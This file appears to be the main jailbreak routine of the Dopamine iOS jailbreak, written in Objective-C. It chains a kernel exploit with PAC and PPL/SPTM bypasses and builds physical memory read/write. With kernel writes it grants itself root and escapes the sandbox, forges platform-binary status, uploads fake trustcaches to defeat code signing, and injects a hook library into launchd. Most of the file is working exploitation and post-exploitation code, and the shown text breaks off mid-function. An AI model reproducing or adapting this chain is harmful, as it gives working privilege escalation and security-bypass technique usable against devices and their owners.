//
//  Jailbreaker.m
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import "DOJailbreaker.h"
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOUIManager.h"
#import "DOPreferenceManager.h"
#import <sys/stat.h>
#import <compression.h>
#import <xpf/xpf.h>
#import <dlfcn.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_IOSurface.h>
#import <libjailbreak/physrw_pte.h>
#import <libjailbreak/physrw.h>
#import <libjailbreak/translation.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/trustcache.h>
#import <libjailbreak/trustcache_fs.h>
#import <libjailbreak/jbserver_boomerang.h>
#import <libjailbreak/signatures.h>
#import <libjailbreak/jbclient_xpc.h>
#import <libjailbreak/jbclient_mach.h>
#import <libjailbreak/kcall_arm64.h>
#import <libjailbreak/basebin_gen.h>
#import <CoreServices/LSApplicationProxy.h>
#import <sys/utsname.h>
#import "spawn.h"
#import "clock_alarm.h"
#import <IOSurface/IOSurfaceRef.h>
int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);

#define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
void _CFPreferencesSetValueWithContainer(CFStringRef key, CFPropertyListRef value, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
Boolean _CFPreferencesSynchronizeWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
CFArrayRef _CFPreferencesCopyKeyListWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
CFDictionaryRef _CFPreferencesCopyMultipleWithContainer(CFArrayRef keysToFetch, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);

//char *_dirhelper(int a, char *dst, size_t size);

NSString *const JBErrorDomain = @"JBErrorDomain";
typedef NS_ENUM(NSInteger, JBErrorCode) {
    JBErrorCodeFailedToFindKernel            = -1,
    JBErrorCodeFailedKernelPatchfinding      = -2,
    JBErrorCodeFailedLoadingExploit          = -3,
    JBErrorCodeFailedExploitation            = -4,
    JBErrorCodeFailedBuildingPhysRW          = -5,
    JBErrorCodeFailedCleanup                 = -6,
    JBErrorCodeFailedGetRoot                 = -7,
    JBErrorCodeFailedUnsandbox               = -8,
    JBErrorCodeFailedPlatformize             = -9,
    JBErrorCodeFailedBasebinTrustcache       = -10,
    JBErrorCodeFailedLaunchdInjection        = -11,
    JBErrorCodeFailedInitProtection          = -12,
    JBErrorCodeFailedInitFakeLib             = -13,
    JBErrorCodeFailedDuplicateApps           = -14,
};

@implementation DOJailbreaker

- (NSError *)gatherSystemInformation
{
    NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
    if (!kernelPath) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache. Ensure your device is properly connected to the internet. If it still does not work, try installing Dopamine via TrollStore instead."}];
    NSLog(@"Kernel at %@", kernelPath);

    NSString *sptmPath = [[DOEnvironmentManager sharedManager] accessibleSPTMPath];
    if (sptmPath) {
        NSLog(@"SPTM at %@", sptmPath);
    }
    NSString *txmPath = [[DOEnvironmentManager sharedManager] accessibleTXMPath];
    if (txmPath) {
        NSLog(@"TXM at %@", txmPath);
    }
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Patchfinding") debug:NO];
    
    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation, sptmPath ? sptmPath.fileSystemRepresentation : NULL, txmPath ? txmPath.fileSystemRepresentation : NULL);
    if (r == 0) {
        char *sets[] = {
            "translation",
            "trustcache",
            "sandbox",
            "physmap",
            "struct",
            "physrw",
            "IOSurface",
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
        };

        uint32_t idx = 0;
        while(sets[++idx]);

        if (xpf_set_is_supported("devmode")) {
            sets[idx++] = "devmode"; 
        }
        if (xpf_set_is_supported("badRecovery")) {
            sets[idx++] = "badRecovery"; 
        }
        if (xpf_set_is_supported("arm64kcall")) {
            sets[idx++] = "arm64kcall"; 
        }
        if (xpf_set_is_supported("perfkrw")) {
            sets[idx++] = "perfkrw";
        }

        _systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
        if (_systemInfoXdict) {
            xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
            if (gXPF.sptm) {
                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
            }
            if (gXPF.txm) {
                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticTxmBase", gXPF.txmBase);
            }
            printf("System Info:\n");
            xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
                if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
                return true;
            });
        }
        if (!_systemInfoXdict) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed with error: (%s)", xpf_get_error()]}];
        }
        xpf_stop();
    }
    else {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF start failed with error: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }
    
    jbinfo_initialize_dynamic_offsets(_systemInfoXdict);
    jbinfo_initialize_hardcoded_offsets();

    // Stash app identifier into jailbreakInfo
    // This will later allow launchdhook to figure out which process is the dopamine app
    if ([NSBundle mainBundle].bundleIdentifier) {
        gSystemInfo.jailbreakInfo.appIdentifier = strdup([NSBundle mainBundle].bundleIdentifier.UTF8String);
    }

    _systemInfoXdict = jbinfo_get_serialized();
    
    if (_systemInfoXdict) {
        printf("System Info libjailbreak:\n");
        xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
            if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                if (xpc_uint64_get_value(value)) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
            }
            return true;
        });
    }
    
    return nil;
}

- (NSError *)doExploitation
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    DOExploit *pacBypass     = [DOExploitManager sharedManager].selectedPACBypass;
    DOExploit *pplBypass     = [DOExploitManager sharedManager].selectedPPLBypass;

    if (!kernelExploit) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Kernel exploit is required but we did not find any"}];
    }
    if (!pacBypass && [DOEnvironmentManager sharedManager].isPACBypassRequired) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but we did not find any"}];
    }
    if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
        if ([DOEnvironmentManager sharedManager].isSPTM) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"SPTM bypass is required but we did not find any"}];
        }
        else {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PPL bypass is required but we did not find any"}];
        }
    }
    
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Exploiting Kernel (%@)"), kernelExploit.name] debug:NO];
    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
    
    jbinfo_initialize_boot_constants();
    libjailbreak_translation_init();
    libjailbreak_IOSurface_primitives_init();
    
    if (pacBypass) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PAC (%@)"), pacBypass.name] debug:NO];
        if ([pacBypass load] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];};
        if ([pacBypass run] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];}
        // At this point we presume the PAC bypass has given us stable kcall primitives
        gSystemInfo.jailbreakInfo.usesPACBypass = true;
    }

    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        if ([DOEnvironmentManager sharedManager].isSPTM) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing SPTM (%@)"), pplBypass.name] debug:NO];
        }
        else {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PPL (%@)"), pplBypass.name] debug:NO];
        }

        if ([pplBypass load] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PPL bypass: %s", dlerror()]}];};
        if ([pplBypass run] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PPL"}];}
        // At this point we presume the PPL bypass gave us unrestricted phys write primitives
    }
    
    if (![DOEnvironmentManager sharedManager].isArm64e) {
        arm64_kcall_init();
    }

    return nil;
}

- (NSError *)buildPhysRWPrimitive
{
    int r = -1;
    if (device_supports_physrw_pte()) {
        r = libjailbreak_physrw_pte_init(false, 0);
    }
    else {
        r = libjailbreak_physrw_init(false);
    }
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBuildingPhysRW userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to build phys r/w primitive: %d", r]}];
    }
    return nil;
}

- (NSError *)cleanUpExploits
{
    int r = [[DOExploitManager sharedManager] cleanUpExploits];
    if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedCleanup userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to cleanup exploits: %d", r]}];
    IOSurface_map_cleanup();
    return nil;
}

- (NSError *)elevatePrivileges
{
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);
    
    // Get uid 0
    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);
    
    // Get gid 0
    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);
    
    // Add P_SUGID
    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }
    
    if (getuid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
    if (getgid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
    
    // Unsandbox
    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    mac_label_set(label, 1, -1);
    NSError *error = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
    if (error) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedUnsandbox userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to unsandbox, /var does not seem accessible (%s)", error.description.UTF8String]}];
    setenv("HOME", "/var/root", true);
    setenv("CFFIXED_USER_HOME", "/var/root", true);
    setenv("TMPDIR", "/var/tmp", true);
    
    // FUCKING dirhelper caches the temporary path
    // So we have to do userland patchfinding to find the fucking string and overwrite it
    /*char **pain = NULL;
    uint32_t *dirhelperData = (uint32_t *)_dirhelper;
    for (int i = 0; i < 100; i++) {
        arm64_register destinationReg;
        uint64_t imm = 0;
        if (arm64_dec_ldr_imm(dirhelperData[i], &destinationReg, NULL, &imm, NULL, NULL) == 0) {
            if (ARM64_REG_GET_NUM(destinationReg) == 1) {
                uint32_t *adrpAddr = &dirhelperData[i - 1];
                uint64_t adrpTarget = 0;
                uint32_t adrpInst = *adrpAddr;
                if (arm64_dec_adr_p(adrpInst, (uint64_t)adrpAddr, &adrpTarget, NULL, NULL) == 0) {
                    pain = (char **)(uint64_t)(adrpTarget + imm);
                    break;
                }
            }
        }
    }
    *pain = strdup("/var/tmp");*/
    
    // Get CS_PLATFORM_BINARY
    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    uint32_t csflags;
    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
    if (!(csflags & CS_PLATFORM_BINARY)) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedPlatformize userInfo:@{NSLocalizedDescriptionKey:@"Failed to get CS_PLATFORM_BINARY"}];
    
    return nil;
}

- (NSError *)showNonDefaultSystemApps
{
    _CFPreferencesSetValueWithContainer(CFSTR("SBShowNonDefaultSystemApps"), kCFBooleanTrue, CFSTR("com.apple.springboard"), CFSTR("mobile"), kCFPreferencesAnyHost, kCFPreferencesNoContainer);
    _CFPreferencesSynchronizeWithContainer(CFSTR("com.apple.springboard"), CFSTR("mobile"), kCFPreferencesAnyHost, kCFPreferencesNoContainer);
    return nil;
}

- (NSError *)ensureDevModeEnabled
{
    if (@available(iOS 16.0, *)) {
        uint64_t developer_mode_storage = 0;
        if (ksymbol(developer_mode_enabled)) {
            developer_mode_storage = kread64(ksymbol(developer_mode_enabled));
        }
        else if (ksymbol_txm(txm_developer_mode_storage)) {
            developer_mode_storage = ksymbol_txm(txm_developer_mode_storage);
        }

        if (developer_mode_storage) {
            kwrite8(developer_mode_storage, 1);
        }
    }
    return nil;
}

- (NSError *)loadBasebinTrustcache
{
    trustcache_file_v1 *basebinTcFile = NULL;
    if (trustcache_file_build_from_path(JBROOT_PATH("/basebin/basebin.tc"), &basebinTcFile) == 0) {
        int r = trustcache_file_upload_with_uuid(basebinTcFile, BASEBIN_TRUSTCACHE_UUID);
        free(basebinTcFile);
        if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload BaseBin trustcache: %d", r]}];
        return nil;
    }
    return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey : @"Failed to load BaseBin trustcache"}];
}

struct boomerang_info {
    mach_port_t serverPort;
    dispatch_semaphore_t boomerangDone;
};

void *boomerang_server(struct boomerang_info *info)
{
    while (true) {
        xpc_object_t xdict = nil;
        if (!xpc_pipe_receive(info->serverPort, &xdict)) {
            if (jbserver_received_boomerang_xpc_message(&gBoomerangServer, xdict) == JBS_BOOMERANG_DONE) {
                dispatch_semaphore_signal(info->boomerangDone);
                break;
            }
        }
    }
    return NULL;
}

- (NSError *)injectLaunchdHook
{
    // Host a boomerang server that will be used by launchdhook to get the jailbreak primitives from this app
    mach_port_t serverPort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
    mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);
    
    struct boomerang_info info;
    info.serverPort = serverPort;
    info.boomerangDone = dispatch_semaphore_create(0);
    
    pthread_t boomerangThread;
    pthread_create(&boomerangThread, NULL, (void *(*)(void *))boomerang_server, &info);
    pthread_detach(boomerangThread);

    // Stash port to server in launchd's initPorts[2]
    // Since we don't have the neccessary entitlements, we need to do it over jbctl
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){MACH_PORT_NULL, MACH_PORT_NULL, serverPort}, 3);
    pid_t spawnedPid = 0;
    const char *jbctlPath = JBROOT_PATH("/basebin/jbctl");
    int spawnError = posix_spawn(&spawnedPid, jbctlPath, NULL, &attr, (char *const *)(const char *[]){ jbctlPath, "internal", "launchd_stash_port", NULL }, NULL);
    if (spawnError != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Spawning jbctl failed with error code %d", spawnError]}];
    }
    posix_spawnattr_destroy(&attr);
    int status = 0;
    do {
        if (waitpid(spawnedPid, &status, 0) == -1) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Waiting for jbctl failed"}];
        }
    } while (!WIFEXITED(status) && !WIFSIGNALED(status));

    // Inject launchdhook.dylib into launchd via opainject
    int r = exec_cmd(JBROOT_PATH("/basebin/opainject"), "1", JBROOT_PATH("/basebin/launchdhook.dylib"), NULL);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"opainject failed with error code %d", r]}];
    }

    // Wait for everything to finish
    dispatch_semaphore_wait(info.boomerangDone, DISPATCH_TIME_FOREVER);
    mach_port_deallocate(mach_task_self(), serverPort);

    return nil;
}

- (NSError *)applyProtection
{
    int r = [[DOEnvironmentManager sharedManager] setPrivatePrebootProtected:YES];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitProtection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed initializing protection with error: %d", r]}];
    }
    return nil;
}

- (NSError *)createFakeLib
{
    int r = basebin_generate(false);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Creating fakelib failed with error: %d", r]}];
    }

    cdhash_t *cdhashes = NULL;
    uint32_t cdhashesCount = 0;
    file_collect_untrusted_cdhashes_by_path(JBROOT_PATH("/basebin/.fakelib/dyld"), &cdhashes, &cdhashesCount);
    if (cdhashesCount != 1) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Got unexpected number of cdhashes for dyld???: %d", cdhashesCount]}];
    
    trustcache_file_v1 *dyldTCFile = NULL;
    r = trustcache_file_build_from_cdhashes(cdhashes, cdhashesCount, &dyldTCFile);
    free(cdhashes);
    if (r == 0) {
        int r = trustcache_file_upload_with_uuid(dyldTCFile, DYLD_TRUSTCACHE_UUID);
        if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload dyld trustcache: %d", r]}];
        free(dyldTCFile);
    }
    else {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : @"Failed to build dyld trustcache"}];
    }
    
    r = [[DOEnvironmentManager sharedManager] setFakelibMounted:YES];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Mounting fakelib failed with error: %d", r]}];
    }
    
    // Now that fakelib is up, we want to make systemhook inject into any binary we spawn
    setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/systemhook.dylib", 1);
    return nil;
}

- (NSError *)ensureNoDuplicateApps
{
    NSMutableSet *dopamineInstalledAppIds = [NSMutableSet new];
    NSMutableSet *userInstalledAppIds = [NSMutableSet new];
    
    NSString *dopamineAppsPath = JBROOT_PATH(@"/Applications");
    NSString *userAppsPath = @"/var/containers/Bundle/Application";
    
    for (NSString *dopamineAppName in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dopamineAppsPath error:nil]) {
        NSString *infoPlistPath = [[dopamineAppsPath stringByAppendingPathComponent:dopamineAppName] stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *infoDictionary = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
        NSString *appId = infoDictionary[@"CFBundleIdentifier"];
        if (appId) {
            if (![dopamineInstalledAppIds containsObject:appId]) {
                [dopamineInstalledAppIds addObject:appId];
            }
            else {
                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_Dopamine_App"), appId, dopamineAppsPath]}];
            }
        }
    }
    
    for (NSString *appUUID in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:userAppsPath error:nil]) {
        NSString *UUIDPath = [userAppsPath stringByAppendingPathComponent:appUUID];
        for (NSString *appCandidate in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:UUIDPath error:nil]) {
            if ([appCandidate.pathExtension isEqualToString:@"app"]) {
                NSString *appPath = [UUIDPath stringByAppendingPathComponent:appCandidate];
                NSString *infoPlistPath = [appPath stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *infoDictionary = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
                NSString *appId = infoDictionary[@"CFBundleIdentifier"];
                if (appId) {
                    [userInstalledAppIds addObject:appId];
                }
            }
        }
    }
    
    NSMutableSet *duplicateApps = dopamineInstalledAppIds.mutableCopy;
    [duplicateApps intersectSet:userInstalledAppIds];
    if (duplicateApps.count) {
        NSMutableString *duplicateAppsString = [NSMutableString new];
        [duplicateAppsString appendString:@"["];
        BOOL isFirst = YES;
        for (NSString *duplicateApp in duplicateApps) {
            if (isFirst) isFirst = NO;
            else [duplicateAppsString appendString:@", "];
            [duplicateAppsString appendString:duplicateApp];
        }
        [duplicateAppsString appendString:@"]"];
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_User_App"), duplicateAppsString, dopamineAppsPath]}];
    }
    
    for (NSString *dopamineAppId in dopamineInstalledAppIds) {
        LSApplicationProxy *appProxy = [LSApplicationProxy applicationProxyForIdentifier:dopamineAppId];
        if (appProxy.installed) {
            NSString *appProxyPath = [[appProxy.bundleURL.path stringByResolvingSymlinksInPath] stringByStandardizingPath];
            if (![appProxyPath hasPrefix:dopamineAppsPath]) {
                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_Icon_Cache"), dopamineAppId, dopamineAppsPath, appProxy.bundleURL.path]}];
            }
        }
    }
    
    return nil;
}

- (NSError *)removeJailbreak
{
    if (@available(iOS 18.0, *)) {
        // On iOS 18+, jailbreak apps persist on the home screen even after a reboot into unjailbroken state
        // So we need to remove them from icon cache before deleting the bootstrap
        [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebuilding Icon Cache") debug:NO];
        [[DOEnvironmentManager sharedManager] rebuildIconCache];
    }

    NSError *err;
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Removing Jailbreak") debug:NO];
    err = [[DOEnvironmentManager sharedManager] deleteBootstrap];
    if (err) return err;

    return nil;
}

- (NSError *)finalizeBootstrapIfNeeded
{
    return [[DOEnvironmentManager sharedManager] finalizeBootstrap];
}

- (NSError *)cleanUpPostExploitation
{
    if (@available(iOS 17.0, *)) {
        uint64_t proc = proc_self();
        uint64_t ucred = proc_ucred(proc);

        // Get uid 0
        kwrite32(ucred + koffsetof(ucred, svuid), 501);
        kwrite32(ucred + koffsetof(ucred, ruid), 501);
        kwrite32(ucred + koffsetof(ucred, uid), 501);
        
        // Get gid 0
        kwrite32(ucred + koffsetof(ucred, rgid), 501);
        kwrite32(ucred + koffsetof(ucred, svgid), 501);
        kwrite32(ucred + koffsetof(ucred, groups), 501);
    }

    return nil;
}

- (void)runWithError:(NSError **)errOut didRemoveJailbreak:(BOOL*)didRemove showLogs:(BOOL *)showLogs
{
    BOOL removeJailbreakEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"removeJailbreakEnabled" fallback:NO];
    BOOL tweaksEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"tweakInjectionEnabled" fallback:YES];
    BOOL idownloadEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"idownloadEnabled" fallback:NO];
    BOOL appJITEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"appJITEnabled" fallback:YES];
    NSNumber *jetsamMultiplierOption = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"jetsamMultiplier"];
    
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *startLog = [NSString stringWithFormat:@"Starting Jailbreak (Model: %s, %@, Configuration: {removeJailbreak=%d, tweakInjection=%d, idownload=%d, appJIT=%d})", systemInfo.machine, NSProcessInfo.processInfo.operatingSystemVersionString, removeJailbreakEnabled, tweaksEnabled, idownloadEnabled, appJITEnabled];
    [[DOUIManager sharedInstance] sendLog:startLog debug:YES];
    
    *errOut = [self gatherSystemInformation];
    if (*errOut) return;
    *errOut = [self doExploitation];
    if (*errOut) {
        // We don't care about the return value of cleanup at this point, we just need to prevent a panic on exit
        [self cleanUpExploits];
        return;
    }
    
    gSystemInfo.jailbreakSettings.markAppsAsDebugged = appJITEnabled;
    gSystemInfo.jailbreakSettings.jetsamMultiplier = jetsamMultiplierOption ? (jetsamMultiplierOption.doubleValue / 2) : 0;
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Building Phys R/W Primitive") debug:NO];
    *errOut = [self buildPhysRWPrimitive];
    if (*errOut) {
        [self cleanUpExploits];
        return;
    }
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Cleaning Up Exploits") debug:NO];
    *errOut = [self cleanUpExploits];
    if (*errOut) return;
    
    // We will not be able to reset this after elevating privileges, so do it now
    if (removeJailbreakEnabled) [[DOPreferenceManager sharedManager] setPreferenceValue:@NO forKey:@"removeJailbreakEnabled"];

    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Elevating Privileges") debug:NO];
    *errOut = [self elevatePrivileges];

    if (*errOut) return;
    *errOut = [self showNonDefaultSystemApps];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    *errOut = [self ensureDevModeEnabled];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }

    // Now that we are unsandboxed, populate the jailbreak root path
    *errOut = [[DOEnvironmentManager sharedManager] ensureJailbreakRootExists];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    
    *errOut = [[DOEnvironmentManager sharedManager] prepareBootstrap];
    if (*errOut) return;
    setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/var/jb/sbin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/usr/bin", 1);
    setenv("TERM", "xterm-256color", 1);

    *errOut = [[DOEnvironmentManager sharedManager] updateBootLogo];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    
    if (!tweaksEnabled) {
        printf("Creating safe mode marker file since tweaks were disabled in settings\n");
        [[NSData data] writeToFile:JBROOT_PATH(@"/basebin/.safe_mode") atomically:YES];
    }
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Loading BaseBin TrustCache") debug:NO];
    *errOut = [self loadBasebinTrustcache];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }

    if (removeJailbreakEnabled) {
        *errOut = [self removeJailbreak];
        [self cleanUpPostExploitation];
        if (!*errOut) *didRemove = YES;
        return;
    }

    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Environment") debug:NO];
    *errOut = [self injectLaunchdHook];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    
    // After the launchd hook is initialized, we need to make the app believe the device is jailbroken
    [[DOEnvironmentManager sharedManager] setJailbroken:YES withVersion:[NSString stringWithContentsOfFile:JBROOT_PATH(@"/basebin/.version") encoding:NSUTF8StringEncoding error:nil]];
    
    // Now that we can, protect important system files by bind mounting on top of them
    // This will be always be done during the userspace reboot
    // We also do it now though in case there is a failure between the now step and the userspace reboot
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Protection") debug:NO];
    *errOut = [self applyProtection];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Applying Bind Mount") debug:NO];
    *errOut = [self createFakeLib];
    if (*errOut) {
